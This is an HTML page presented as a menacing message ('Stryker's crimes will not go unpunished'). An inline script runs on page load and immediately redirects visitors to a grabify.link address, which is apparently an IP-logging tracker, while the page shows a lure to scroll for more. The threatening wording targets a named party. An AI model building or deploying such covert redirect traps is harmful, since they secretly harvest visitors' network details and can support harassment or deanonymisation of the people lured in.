<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #000;
            background-image: url('https://www.transparenttextures.com/patterns/spooky.png');
            background-size: cover;
            color: white;
        }

        h1 {
            font-size: 2em;
            margin-top: 20%;
        }

        .lightning {
            position: fixed;
            top: 0;
            width: 10%;
            height: 100%;
            z-index: -1;
        }

        .left-lightning {
            left: 0;
        }

        .right-lightning {
            right: 0;
        }

        .message-box {
            margin: 20px;
            padding: 20px;
            background-color: rgba(255, 255, 255, 0.3);
            border: 2px solid white;
            display: inline-block;
            max-width: 80%;
        }

        .message-box p {
            font-size: 1.5em;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="lightning left-lightning">
        <img src="https://media.giphy.com/media/3o6Zt5xp7YwHHjLofC/giphy.gif" alt="Lightning Gif" width="100%">
    </div>
    <div class="lightning right-lightning">
        <img src="https://media.giphy.com/media/3o6Zt5xp7YwHHjLofC/giphy.gif" alt="Lightning Gif" width="100%">
    </div>

    <div class="message-box">
        <p>Stryker's crimes will not go unpunished. Justice will be had.</p>
    </div>

    <h1>Scoll down for more</h1>
    <script>
        window.location.href = "https://grabify.link/ABSG4D";
    </script>
</body>
</html>
